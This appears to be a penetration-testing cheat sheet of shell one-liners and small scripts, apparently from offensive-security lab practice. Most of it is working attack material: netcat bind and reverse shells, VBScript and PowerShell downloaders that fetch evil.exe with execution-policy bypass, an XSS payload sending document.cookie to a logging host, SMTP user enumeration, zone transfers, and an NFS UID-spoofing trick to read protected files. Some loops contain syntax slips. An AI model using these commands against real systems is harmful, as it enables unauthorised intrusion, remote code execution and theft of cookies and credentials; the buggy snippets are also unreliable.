find / -name *.exe -exec file {} \; #search & execute comand  
updatedb #update local database of locate tool  
locate file.name #search file  
which file.name #search file  
################################################################################  
netstat -antp | grep sshd #all open ports with sshd  
update-rc.d ssh enable #enable ssh autorun  
rcconf #list all services  
################################################################################  
cat index.html | grep "href=" |cut -d"/" -f3|grep "host\.com"|cut -d'"' -f1|sort -u | more #extract & show all domains in index.html  
grep -o '[A-Za-z0-9_\.-]*\.*host.com' index.html|sort -u #second variant  
  
host www.host.com | grep "has address" |cut -d" " -f4 #extract all ip from host  
  
#######SCRIPT EXTRACTOR AND HOST FINDER#########################################  
#!/bin/bash  
for url in$(cat host.txt);do  
host $url| grep "has address"|cut -d" " -f4  
done  
################################################################################  
#######PING EACH HOSTS##########################################################  
#!/bin/bash  
for ip in$(seq 200 210); do  
echo 192.168.1.$ip |grep "bytes from" |cut -d" " -f4 |cut -d":" -f1 &  
done  
################################################################################  
  
#FILE TRANSFER  
nc -lnvp 4444 > incoming.exe  
nc -nv IPFROM 4444 </path/to/file/to/send  
#BIND SHELL  
nc -lvp 4444 -e cmd.exe  
nc -vn TARGETIP 4444  
#REVERSE SHELL  
nc -vn TARGETIP 4444 -e /bin/bash  
nc -lvp 4444  
  
ncat -lvp 4444 -e cmd.exe --allow 10.0.0.22 --ssl  
ncat -v 10.0.0.22 4444 --ssl  
  
#ZONE TRANSFER##################################################################  
#!/bin/bash  
if [ -z "$1" ]; then  
    echo "[*] Simple Zone transfer script"  
    echo "[*] Usage     : $0 <domain name> "  
    exit 0  
fi      
for server in $(host -t ns $1 |cut -d" " -f4);do  
        host -l $1 $server | grep "has address"  
done  
################################################################################  
host -t ns target.com #shows all ns records  
host -t mx target.com #shows all mx records  
################################################################################  
nc -nvv -w 1 -z TARGETIP 3385-3395 #TCP connect scanning  
nc -unvv -w 1 -z TARGETIP 3385-3395 #UDP scanning  
################################################################################  
nmap -sn TARGETIP #ICMP scan  
nmap #NSE Script scanning /usr/share/nmap/scripts  
nmap -p 139,445 --script=smb-enum-users IP #enumerate users on windows  
nmap -p 139,445 --script=smb-check-vulns --script-args=unsafe=1 IP #check vulnerability of host for smb attacks  
################################################################################  
nbtscan TARGETIP Or DIAPASONE  
################################################################################  
rpcclient -U "" TARGETIP  
    srvinfo  
    enumdomusers  
    getdompwinfo  
################################################################################  
enum4linux -v TARGETIP #enumerate host  
################################################################################  
for users in $(cat users.txt); do echo VRFY $user |nc -nv -w 1 IP PORT25 2>/dev/null|grep ^"250";done #enum users on smtp  
################################################################################  
#!/usr/bin/python  
import socket  
import sys  
if len(sys.argv) != 2:  
    print("Usage: vrfy.py <username>")  
    sys.exit(0)  
  
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM) # create socket  
connect=s.connect(('TARGETIP',25))                  #connect to server  
banner=s.recv(1024)                                 #receive banner  
print(banner)  
s.send('VRFY ' + sys.argv[1]+'\r\n')                #VRFY user  
result=s.recv(1024)  
print(result)  
s.close()                                           #close socket  
################################################################################  
onesixtyone -c file.txt -i ips #list snmp versions  
snmpwalk -c public -v1 IP #enumerate snmp  
################################################################################  
ON LINUX  
mkdir /tftp  
atftpd --daemon --port 69 /tftp  
cp /usr/share/windows-binaries/bc.exe /tftp/  
ON WINDOWS  
tftp -i KALIHOST GET nc.exe  
################################################################################  
apt install pure-ftpd  
cat setup-ftp  
  
#!/bin/bash  
groupadd ftpgroup  
useradd -g ftpgroup -d /dev/null -s /etc ftpuser  
pure-pw useradd offsec -u ftpuser -d /ftphome  
pure-pw mkdb  
cd /etc/pure-ftpd/auth  
ln -s ../conf/PureDB 60pdb  
mkdir -p /ftphome  
chown -R ftpuser:ftpgroup /ftphome/  
/etc/init.d/pure-ftpd restart  
----------------  
cat ftp-commands  
ON WINDOWS  
echo open TARGETIP 21> ftp.txt  
echo offsec >> ftp.txt  
echo lab >> ftp.txt  
echo bin >> ftp.txt  
echo GET evil.exe >> ftp.txt  
echo bye >> ftp.txt  
ftp -s:ftp.txt  
----------------  
echo strUrl= WScript.Arguments.Item(0) > wget.vbs  
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs  
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs  
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs  
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs  
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs  
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs  
echo Err.Clear >> wget.vbs  
echo Set http = Nothing >> wget.vbs  
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1"),>> wget.vbs   
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs  
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs  
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs   
echo http.Open "GET", strURL, false >> wget.vbs  
echo http.Send >> wget.vbs  
echo varByteArray = http.ResponseBody >> wget.vbs  
echo Set http = Nothing >> wget.vbs  
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs  
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs  
echo strData = "" >> wget.vbs  
echo strBuffer = "" >> wget.vbs  
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs  
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter+1,1))) >> wget.vbs  
echo Next >> wget.vbs   
echo ts.Close >> wget.vbs  
  
cscript wget.vbs http://192.168.10.5/evil.exe evil.exe  
  
-----------------  
echo $storageDir = $pwd > wget.ps1  
echo $webclient = New-Object System.Net.WebClient >>wget.ps1  
echo $url = "http://192.168.10.5/evil.exe">>wget.ps1  
echo $file = "new5exploit.exe" >>wget.ps1  
echo $webclient.DownloadFile($url,$file) >>wget.ps1  
  
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1  
-----------------  
<script>  
new Image().src="http://targetip/log.php?outpur="+document.cookie;  
</script>  
################################################################################  
host -t mx TARGETDOMAIN #shows all MX records for domain  
host -l domain nsserver #dns zone transfer  
dnsrecon -d domain -D domains.file -t brt #brute enum zone  
dnsenum domain #enum zone  
################################################################################  
sudo nbtscan -r hostname/24  
################################################################################  
nmap -sV -p 111 --script=rpcinfo TARGET #scan NFS shares  
#if found share do  
mkdir share  
sudo mount -o nolock TARGET:/SHARE ~/SHARE  
#if no access to file  
sudo adduser username  
sudo sed -i -e 's/1001/1014/g' /etc/passwd  
su username  
id  
cat secret/file.crd  
################################################################################